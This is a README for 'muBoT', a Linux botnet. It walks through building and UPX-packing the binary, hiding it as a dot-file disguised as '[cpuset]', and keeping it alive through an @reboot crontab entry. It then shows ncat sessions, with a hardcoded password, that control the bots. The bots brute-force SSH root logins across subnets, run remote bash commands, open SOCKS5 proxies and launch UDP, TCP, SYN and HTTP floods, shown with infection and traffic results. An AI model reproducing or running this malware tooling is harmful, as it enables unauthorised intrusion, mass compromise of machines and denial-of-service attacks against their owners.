# mubot
muBoT BlockChain BoTNET

>BoTMaster -> CMD -> BOT -> Yes My Lord -> BoTMaster
>
>BoTMaster0 -> CMD ------> BOT0 --CMD-> BOT1 -> Yes My Lord -> BoTMaster0
>		          x---CMD----> BOT2 -> Yes My Lord -> BoTMaster0
>                         x---CMD----> BOT3 -> Yes My Lord -> BoTMaster0
>                          x------------------> Yes My Lord -> BoTMaster0
>
>BoTMaster0 -> CMD -> BOT0 --CMD--> BOT1 -> Yes My Lord -> BoTMaster0
>		     x              x---------------------> Yes My Lord -> BoTMaster1
>                     |   
                     |                            
		     |----CMD---> BOT2 -> Yes My Lord -> BoTMaster0
                     |              x--------> Yes My Lord -> BoTMaster1
                     |
                     |
                     |----CMD---> BOT3 -> Yes My Lord -> BoTMaster0
                     |              x--------> Yes My Lord -> BoTMaster1
                     |
		     |
                     |----------------> Yes My Lord -> BoTMaster0
                     x---------------> Yes My Lord -> BoTMaster1



-------BoTMaster------

                    <AdmListen--------BoT0
		    <BoTListen------------x
		    
                                      
                    <AdmListen--------BoT1
                    <BoTListen------------x


                    <AdmListen--------BoT2
                    <BoTListen-------------x




			          SCAN-FOUND-NOTHING
                                        |
                      <AdmListen-------BoT0          
x--------------------<BoTListen---------x
|                                       |
|                                   SYNC-BOTS
|   
|                                  SCAN-FOUND
|                                      |                                      
|                    <AdmListen-------BoT1 --EXPLOITED MSG ->-<----------------BOTLISTEN--------BoTMaster0
SYNC              <BoTListen-----------x                                           |
|                                      |                                           |
|                                    SLEEP                                         |
|                                                                                  | 
|                                  SCAN-FOUND                                      |
|                                      |                                           |
|                    <AdmListen--------BoT2---EXPLOITED MSG -----------------------x 
x------------------>-<BoTListen--------x
                                       |
				     SLEEP







Optimal System Configuration
############################################INSTALL.SH##############################################
#!/bin/bash
mkdir src
cd src
apt-get install build-essential fakeroot devscripts -y
sleep 1
apt-get build-dep glibc -y
sleep 1
apt-get source glibc
cd glibc*/
sed -i 's:3.2.0:1.33.7:g' sysdeps/unix/sysv/linux/configure
sed -i 's:3.2.0:1.33.7:g' sysdeps/unix/sysv/linux/configure.ac
sed -i 's:3.2:1.33.7:g' debian/sysdeps/linux.mk
debuild -b -uc -us
cd ..
dpkg -i *.deb
apt-get build-dep krb5 -y
sleep 1
apt-get source krb5
cd krb5*/
cd src
./configure --prefix=/usr --enable-static --disable-shared
make
make install
make clean
./configure --prefix=/usr --enable-shared --disable-static
make
make install
cd ..
cd ..
sleep 1
apt-get install libssh-dev libssl-dev cmake libnacl-dev -y
#########################################################################################################
this script takes one hour to make ur system ready for run on all systems Kernel 1.33.7 and higher



Debian31337:~# cd muBoT/
Debian31337:~/muBoT# cd build/
Debian31337:~/muBoT/build# cmake ..
-- The C compiler identification is GNU
-- The CXX compiler identification is GNU
-- Check for working C compiler: /usr/bin/gcc
-- Check for working C compiler: /usr/bin/gcc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Configuring done
-- Generating done
-- Build files have been written to: /root/muBoT/build

Debian31337:~/muBoT/build# make
Scanning dependencies of target muBoT
[100%] Building C object CMakeFiles/muBoT.dir/muBoT.o
Linking C executable muBoT
[100%] Built target muBoT

Debian31337:~/muBoT/build# file muBoT 
muBoT: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 1.33.7, BuildID[sha1]=0068f5263dc68c875950e168d817e0f44671b5d5, stripped

///////// Oh GNU/Linux 1.33.7 <--- u think thats a fake ? no read the end to know how u build ur linux 


Debian31337:~/muBoT/build# ls -lsa
total 5720
   4 drwxr-xr-x 3 root root    4096 Dec 25 20:26 .
   4 drwxr-xr-x 9 root root    4096 Dec 25 20:25 ..
  16 -rw-r--r-- 1 root root   13502 Dec 25 20:26 CMakeCache.txt
   4 drwxr-xr-x 5 root root    4096 Dec 25 20:26 CMakeFiles
   4 -rw-r--r-- 1 root root    1470 Dec 25 20:26 cmake_install.cmake
   8 -rw-r--r-- 1 root root    4507 Dec 25 20:26 Makefile
5680 -rwxr-xr-x 1 root root 5813180 Dec 25 20:26 muBoT

Debian31337:~/muBoT/build# ls -lsah
4.0K drwxr-xr-x 3 root root 4.0K Dec 25 20:26 .
4.0K drwxr-xr-x 9 root root 4.0K Dec 25 20:25 ..
 16K -rw-r--r-- 1 root root  14K Dec 25 20:26 CMakeCache.txt
4.0K drwxr-xr-x 5 root root 4.0K Dec 25 20:26 CMakeFiles
4.0K -rw-r--r-- 1 root root 1.5K Dec 25 20:26 cmake_install.cmake
8.0K -rw-r--r-- 1 root root 4.5K Dec 25 20:26 Makefile
5.6M -rwxr-xr-x 1 root root 5.6M Dec 25 20:26 muBoT


the bot is compiled. i know u want to know the CMakeList.txt to know what for libs are static
and what for not but this is my secret u can know it download the source

you can see it has 5,6 megabytes without upx
https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz


Debian31337:~/muBoT/build# ./upx -9 -f muBoT
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   5813180 ->   2642508   45.46%   linux/i386    muBoT

Packed 1 file.
Debian31337:~/muBoT/build# ls -lsah
total 2.6M
4.0K drwxr-xr-x 3 root root 4.0K Dec 25 20:29 .
4.0K drwxr-xr-x 9 root root 4.0K Dec 25 20:25 ..
 16K -rw-r--r-- 1 root root  14K Dec 25 20:26 CMakeCache.txt
4.0K drwxr-xr-x 5 root root 4.0K Dec 25 20:26 CMakeFiles
4.0K -rw-r--r-- 1 root root 1.5K Dec 25 20:26 cmake_install.cmake
8.0K -rw-r--r-- 1 root root 4.5K Dec 25 20:26 Makefile
2.6M -rwxr-xr-x 1 root root 2.6M Dec 25 20:26 muBoT

with upx it has 2,6 MB 

Debian31337:~/muBoT/build# file muBoT 
muBoT: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header




Debian31337:~/muBoT/build# ldd muBoT
	not a dynamic executable


Debian31337:~/muBoT/build# readelf -d muBoT

There is no dynamic section in this file.


Debian31337:~/muBoT/build# strace -e trace=open /root/muBoT/build/muBoT 
open("/proc/self/exe", O_RDONLY)        = 3
+++ exited with 0 +++

Debian31337:~/muBoT/build# mv muBoT /root/.muBoT
Debian31337:~/muBoT/build# cd
Debian31337:~# ./.muBoT 10.0.0.116 <----- this is the ip of the maschine where the bot is running
Debian31337:~# ps x
 2880 pts/1    S      0:00 [cpuset]        

Debian31337:~# netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 *:ssh                   *:*                     LISTEN     
tcp        0      0 *:31337                 *:*                     LISTEN     
tcp        0      0 *:1337                  *:*                     LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     


Debian31337:~# netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
 

Debian31337:~# crontab -l
@reboot /root/.muBoT


the bot does not need to start from root!!!!!!!!!!!!!!!!!!!!!
----------------------------------------------------------------
let us auth to the bot with the ncat


to get the output of the bot (only works if !addadm <your ip> enabled 
the bot works standart silent
root@lamer:~# ncat -k -l -p 31337 &

root@lamer:~# echo '!logmein hur3hur3' | ncat 10.0.0.103 31337

for sending glob command to the bots

root@lamer:~# echo '!logmein hur3hur3' | ncat 10.0.0.103 31337
root@lamer:~# echo '!addadm 10.0.0.254' | ncat 10.0.0.103 31337
My Master > 10.0.0.254 

root@lamer:~#  echo '!help' | ncat 10.0.0.103 31337
               ____          _____
              |  _ \        (_   _)
 _   _  _   _ | |_) )  ___    | |
| | | || | | ||  _ (  / _ \   | |
| |_| || |_| || |_) )( (_) )  | |
| ._,_| \___/ |____/  \___/   |_|
| | By BoSSaLiNiE Privat Edition
|_|   v0.23ya.21mu-xmas-torum
<< !help 	> show this
<< !logmein 	> !logmein <PASS>
<< !rndscan 	> !rndscan 192.*.*.* <THREADS> <MINUTES>
<< !suba 	> !suba 192 <THREADS>
<< !subb 	> !subb 192.168 <THREADS>
<< !subc 	> !subc 192.168.0 <THREADS>
<< !autoscan 	> !autoscan <change range every x mins> <mins to run autoscan> <THREADS>
<< !ssyn2 	> !ssyn2 <target IP/hostname> <PORT> <THREADS> <TIME>
<< !udp 	> !udp <target IP/hostname> <PORT> <throttle (lower is faster)> <packet size> <THREADS> <SECS>
<< !webdos	> !webdos <hostname or ip> <port> <page path> <children> <loops/child>
<< !tcp 	> !tcp <target IP> <PORT> <THREADS> <pps limiter, -1 for no limit> <time>
<< !sysinfo 	> shows systeminfo - IP>RAM>CPU
<< !socks5srv   > !socks5srv <PORT>  <-- start socks5srv
<< !dc		> !dc 192.168.178.1 !sysinfo < sends command to single bot
<< !bash 	> !dc 192.168.178.1 !bash ls -lsa < sends bash command
<< !glob 	> !glob !sysinfo < sends command global to all bots
<< !logout 	> !glob !logout <PASS> < sets bot password and disabled it
<< !addadm 	> !glob !addadm <your ip> < glob admin reg
<< !list 	> !glob !list < show bot list
<< !deladm 	> !glob !deladm < delete all admins
<< !die		> !die < Clean PURGE of bot
<< INFO 	> use the !glob command to send to all
--------------------------------KNOW BUGS--------------------------------
<< NONE
root@lamer:~#
we can see the bot has some features lemme start with the !rndscan command

!rndscan 192.*.*.* <THREADS> <MINUTES>
example

!rndscan 192.*.*.* 10000 60
or
!rndscan 192.168.*.* 1000 30
or
!rndscan 192.168.178.* 100 15

letme scan my network 

root@lamer:~# echo '!rndscan 10.0.0.* 50 3' | ncat 10.0.0.103 1112
Sat Dec 21 02:56:56 2019

[ RANDOMSCAN STARTED ]SUBNET[ 10.0.0.* ]THREADS[ 50 ]TIME[ 3 ]Sat Dec 21 02:57:04 2019

OWNED:[ root / lol ]IP:[ 10.0.0.106 ] - SSH-2.0-OpenSSH_7.9p1 Debian-10
Sat Dec 21 02:57:04 2019

OWNED:[ root / lol ]IP:[ 10.0.0.104 ] - SSH-2.0-OpenSSH_7.9p1 Debian-10
Sat Dec 21 02:57:02 2019

OWNED:[ root / lol ]IP:[ 10.0.0.119 ] - SSH-2.0-OpenSSH_5.1p1 Debian-5
Sat Dec 21 02:57:05 2019

OWNED:[ root / lol ]IP:[ 10.0.0.102 ] - SSH-2.0-OpenSSH_7.9p1 Debian-10
Sat Dec 21 02:57:04 2019

OWNED:[ root / lol ]IP:[ 10.0.0.107 ] - SSH-2.0-OpenSSH_7.9p1 Debian-10
Sat Dec 21 02:57:04 2019

OWNED:[ root / lol ]IP:[ 10.0.0.108 ] - SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8
Sat Dec 21 02:57:04 2019

OWNED:[ root / lol ]IP:[ 10.0.0.123 ] - SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8
Sat Dec 21 02:57:04 2019

OWNED:[ root / lol ]IP:[ 10.0.0.221 ] - SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze5
XD  Sat Dec 21 02:57:04 2019

OWNED:[ root / lol ]IP:[ 10.0.0.123 ] - SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8
Sat Dec 21 02:57:10 2019

OWNED:[ root / lol ]IP:[ 10.0.0.118 ] - SSH-2.0-OpenSSH_5.1p1 Debian-5
Sat Dec 21 02:57:16 2019

OWNED:[ root / lol ]IP:[ 10.0.0.120 ] - SSH-2.0-OpenSSH_5.1p1 Debian-5
Sat Dec 21 02:57:14 2019

OWNED:[ root / lol ]IP:[ 10.0.0.109 ] - SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u4
Sat Dec 21 02:57:16 2019

OWNED:[ shell / shell ]IP:[ 10.0.0.115 ] - SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u4
Sat Dec 21 02:57:19 2019

OWNED:[ root / lol ]IP:[ 10.0.0.124 ] - SSH-2.0-OpenSSH_5.1p1 Debian-5
Sat Dec 21 02:57:22 2019

OWNED:[ root / lol ]IP:[ 10.0.0.101 ] - SSH-2.0-OpenSSH_7.9p1 Debian-10
Sat Dec 21 02:57:27 2019

OWNED:[ root / lol ]IP:[ 10.0.0.116 ] - SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u4
Sat Dec 21 02:57:38 2019

OWNED:[ root / lol ]IP:[ 10.0.0.105 ] - SSH-2.0-OpenSSH_7.9p1 Debian-10
Sat Dec 21 02:57:42 2019

OWNED:[ root / lol ]IP:[ 10.0.0.105 ] - SSH-2.0-OpenSSH_7.9p1 Debian-10
Sat Dec 21 02:57:55 2019

OWNED:[ root / lol ]IP:[ 10.0.0.114 ] - SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u7
Sat Dec 21 02:59:56 2019

[ WAITING OF THREADS ]

Sat Dec 21 03:06:49 2019

[ SCAN DONE ]
The operation took 594.246 seconds

///// i swear i have testet the bot :D if u need more results of older SSH 

change this line 

@libssh-0.7.3 src

nano DefineOptions.cmake

option(WITH_SSH1 "Build with SSH1 support" OFF)
to
option(WITH_SSH1 "Build with SSH1 support" ON)




now letme logme in to the exploitet bots and add me as botmaster

root@lamer:~# echo '!glob !logmein hur3hur3' | ncat 10.0.0.103 31337
Password correct
.........
root@lamer:~# echo '!glob !addadm 10.0.0.254' | ncat 10.0.0.103 31337
My Master > 10.0.0.254 
My Master > 10.0.0.254 
My Master > 10.0.0.254 
My Master > 10.0.0.254 
My Master > 10.0.0.254 
My Master > 10.0.0.254 
..........

root@lamer:~# echo '!glob !list' | ncat 10.0.0.103 31337
[0][Devel1x64][x86_64][4.19.0-6-amd64][10.0.0.101]
[0][Debian31337][x86_64][2.6.26-2-amd64][10.0.0.102]
[0][Devel5x64][x86_64][4.19.0-6-amd64][10.0.0.105]
[0][Devel-HTTP-1][x86_64][4.19.0-6-amd64][10.0.0.106]
[0][Devel-WINE-1][x86_64][4.19.0-6-amd64][10.0.0.107]
[3][wheezy-dev][x86_64][3.2.0-4-amd64][10.0.0.115]
[0][Devel4x64][x86_64][4.19.0-6-amd64][10.0.0.104]
..................
-1-------2-------3---------4-----------------5

1 is the system uptime.
2 is the hostname of the maschine .
3 is the architecture of the os.
4 is the kernel version
5 is the ip of the slave

we can see we got no duplicates of the bot in the list the bot checks everything if exist


root@lamer:~# echo '!glob !bash uptime' | ncat 10.0.0.103 31337
 00:00:01 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00

 00:00:02 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00

 00:00:03 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00

 00:00:04 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00

 00:00:05 up 16:06,  3 users,  load average: 0.00, 0.00, 0.00

 00:00:06 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00

 00:00:03 up 3 days,  4:20,  1 user,  load average: 0.00, 0.01, 0.05
.....................

this is the bash command if it need it !glob 


you can control the bot in single mode with the !dc command

root@lamer:~# echo '!dc 10.0.0.107 !bash df -h' | ncat 10.0.0.103 31337
Filesystem      Size  Used Avail Use% Mounted on

udev            983M     0  983M   0% /dev

tmpfs           200M  2.9M  197M   2% /run

/dev/sda1       124G  3.0G  115G   3% /

tmpfs           998M     0  998M   0% /dev/shm

tmpfs           5.0M     0  5.0M   0% /run/lock

tmpfs           998M     0  998M   0% /sys/fs/cgroup

tmpfs           200M     0  200M   0% /run/user/0


how does the !dc command work in the blockchain system ?

example

 
root@lamer:~# echo '!dc 10.0.0.107 !bash uptime' | ncat 10.0.0.103 31337
               |
               |
               |                         
BoTMaster0----CMD--->BoT0--CMD->BoT342--OUTPUT-->BoTMaster0

or you can connect to BoT342 to do the same

now let me dos one of my servers

root@lamer:~# echo '!glob !udp 10.0.0.106 53 1 1024 2 30' | ncat 10.0.0.103 31337
Tue Dec 24 00:11:16 2019

UDP Flooder v1.2.8 FINAL by ohnoes1479
Setting up Sockets...

Tue Dec 24 00:11:17 2019

UDP Flooder v1.2.8 FINAL by ohnoes1479
Setting up Sockets...

Tue Dec 24 00:11:18 2019

UDP Flooder v1.2.8 FINAL by ohnoes1479
Starting Flood > 10.0.0.106 ...
Starting Flood > 10.0.0.106 ...
Setting up Sockets...

Tue Dec 24 00:11:19 2019

UDP Flooder v1.2.8 FINAL by ohnoes1479
Starting Flood > 10.0.0.106 ...
Setting up Sockets...

Tue Dec 24 00:11:20 2019

UDP Flooder v1.2.8 FINAL by ohnoes1479
Tue Dec 24 00:11:21 2019

UDP Flooder v1.2.8 FINAL by ohnoes1479
Starting Flood > 10.0.0.106 ...
Setting up Sockets...

Setting up Sockets...

!udp 10.0.0.106 53 1 1024 2 30 


Starting Flood > 10.0.0.106 ...
Starting Flood > 10.0.0.106 ...
Tue Dec 24 00:11:18 2019

UDP Flooder v1.2.8 FINAL by ohnoes1479
Setting up Sockets...

Starting Flood > 10.0.0.106 ...
Tue Dec 24 00:11:49 2019

[UDP DONE]

The operation took 34.007 seconds

Tue Dec 24 00:11:50 2019

[UDP DONE]

Tue Dec 24 00:11:51 2019

[UDP DONE]

The operation took 34.008 seconds

Tue Dec 24 00:11:52 2019

[UDP DONE]

The operation took 34.003 seconds

The operation took 34.006 seconds

Tue Dec 24 00:11:54 2019

[UDP DONE]

Tue Dec 24 00:11:54 2019

[UDP DONE]

Tue Dec 24 00:11:54 2019

[UDP DONE]

The operation took 34.011 seconds

The operation took 35.068 seconds

Tue Dec 24 00:11:51 2019

[UDP DONE]

The operation took 34.009 seconds


now the statistic of the attacked server by vnstat


 ens18  /  traffic statistics

                           rx         |       tx
--------------------------------------+------------------
  bytes                     7.39 GiB  |         157 KiB
--------------------------------------+------------------
          max            3.40 Gbit/s  |       46 kbit/s
      average          377.78 Mbit/s  |     7.66 kbit/s
          min               1 kbit/s  |        1 kbit/s
--------------------------------------+------------------
  packets                    7442394  |             460
--------------------------------------+------------------
          max             398919 p/s  |          15 p/s
      average              44299 p/s  |           2 p/s
          min                  1 p/s  |           1 p/s
--------------------------------------+------------------
  time                  0.80 minutes

UDP Flooder v1.2.8 FINAL by ohnoes1479 <--- hehe leet

root@lamer:~# echo '!dc 10.0.0.106 !sysinfo' | ncat 10.0.0.103 31337
muBoT Remote System Information

lo IP Address 127.0.0.1
ens18 IP Address 10.0.0.106
lo IP Address ::
ens18 IP Address 0:0:fe80::bcad:2dff
Total RAM 1994 MB - Free RAM: 1441 MB
model name	: Intel(R) Core(TM) i7-XXXXXX CPU @ 3.00GHz

cpu MHz		: 2993.302

cpu cores	: 4



the sysinfo system is tiny i think its no more needed if u know some !bash commands


root@lamer:~# echo '!glob !die' | ncat 10.0.0.103 31337
Purge BoT>RM AUTOSTART>KILL BoT>RM DBs>RM BOT...
Purge BoT>RM AUTOSTART>KILL BoT>RM DBs>RM BOT...
Purge BoT>RM AUTOSTART>KILL BoT>RM DBs>RM BOT...
Purge BoT>RM AUTOSTART>KILL BoT>RM DBs>RM BOT...
Purge BoT>RM AUTOSTART>KILL BoT>RM DBs>RM BOT...
Purge BoT>RM AUTOSTART>KILL BoT>RM DBs>RM BOT...
Purge BoT>RM AUTOSTART>KILL BoT>RM DBs>RM BOT...
..............
the bot is complety removed from system and from crontab.


!autoscan 	> !autoscan <change range every x mins> <mins to run autoscan> <THREADS>


you can enter !glob !autoscan 30 1000000000 10000


